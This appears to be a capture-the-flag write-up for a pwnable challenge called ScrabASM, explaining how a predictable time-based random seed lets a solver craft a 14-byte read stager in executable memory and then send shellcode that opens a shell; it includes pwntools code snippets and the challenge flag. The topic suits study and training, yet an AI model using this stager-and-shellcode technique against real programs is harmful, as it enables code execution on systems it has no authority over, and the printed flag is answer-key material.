# ScrabASM

## 1. Summary

- **Category**: Pwnable
- **Points**: 105
- **Solves**: 305

### Description

> `Scrabble for ASM!`

## 2. Analysis

### Checksec

```text
    Arch:      amd64-64-little
    RELRO:     Full RELRO
    Stack:     No canary found
    NX:        NX enabled
    PIE:       PIE enabled
    SHSTK:     Enabled
    IBT:       Enabled
    Stripped:  No
```

### Vulnerability

- **PRNG Predictability & Small Shellcode Execution**:
  The program initializes a "hand" of 14 bytes using `srand(time(NULL))`. Since the seed is predictable, we can determine the sequence of random bytes. The program allows swapping tiles (re-rolling `rand()`) and eventually executes these 14 bytes in an `RWX` memory region.

## 3. Exploit Flow

1. **Seed Synchronization**
   To synchronize the `hand` values with the server, we call `libc.srand(libc.time())` at the moment of connection and generate the same random sequence.

   ```python
   libc.srand(libc.time())

   for i in range(HAND_SIZE):
       hand.append(libc.rand() & 0xFF)

   log.info(" ".join(hex(hand[i]) for i in range(HAND_SIZE)))
   ```

2. **Tile Swapping (Code Crafting)**
   The 14-byte limit is too small for a full shellcode. Instead, we use `swap_tile()` to brute-force a small **read stager** (14 bytes or less) that will allow us to read a larger payload into the same buffer.

   ```python
   code = asm(
       """
       xor rax, rax
       push rdi
       pop rsi
       xor rdi, rdi
       mov dl, 0xff
       syscall
       """
   )

   while i < len(code):
       if hand[i] != code[i]:
           commands.append(f"1\n{i}")
           hand[i] = libc.rand() & 0xFF
       else:
           i += 1

   r.sendlineafter(b"> ", "\n".join(commands).encode())
   ```

3. **Staging & Shell**
   Once the stager is ready, we trigger `play()`. The stager executes and waits for input at `0x13370000`. We then send NOP-padded shellcraft code to obtain the shell.

   ```python
   r.send(b"\x90" * len(code) + asm(shellcraft.sh()))
   ```

## 4. Final Solution

- **Exploit Code**: [Link to Script / GitHub](./solve.py)

## 5. Flag

`lactf{gg_y0u_sp3ll3d_sh3llc0d3}`
